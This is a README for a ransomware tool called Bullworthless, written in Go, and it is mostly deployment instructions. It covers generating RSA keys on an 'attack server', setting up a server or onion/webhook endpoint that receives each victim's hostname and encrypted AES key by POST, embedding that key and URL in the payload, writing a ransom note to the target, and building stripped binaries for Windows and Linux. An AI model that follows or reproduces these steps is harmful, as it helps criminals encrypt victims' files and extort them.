# Bullworthless Ransomware


## Steps:
run `-h` on the server or bullworthlessDecrypt binaries for usage.

### Attack Server Setup
1. Use keys provided, or generate your own public and private RSA keys on your attack server.
	* `./server -genkeys`
2. Make sure your web server ready to accept a POST request and receive the params `hostname`, `key`, and `sha256sum`. Highly suggested you store these or write them to a file.

### Bullworthless Payload Setup
1. Replace the public key in bullworthless.go with the public key generated on the attacker server.
2. A note also gets written to the target. Add instructions, key information, etc.
3. Add your attacker server url, onion address, or webhook in the `PostForm` method in the `sendKey` function of bullworthless.go
4. Compile for target OS.
	* **Windows**:  export GOOS=windows GOARCH=amd64;go build -ldflags "-w -s" bullworthless.go
	* **Linux**:  export GOOS=linux GOARCH=amd64;go build -ldflags "-w -s" bullworthless.go
5. Run

### Decryption Steps
The attacker server or webhook will receive the encrypted AES key. In the same dir as the private key generated on the attacker server run: `./server -decryptAES <encrypted_key>`
This will get you back the AES key.

Then to decrypt the files again run: `./BullworthlessDecrypt -key <decrypted_key>` on the victim machine
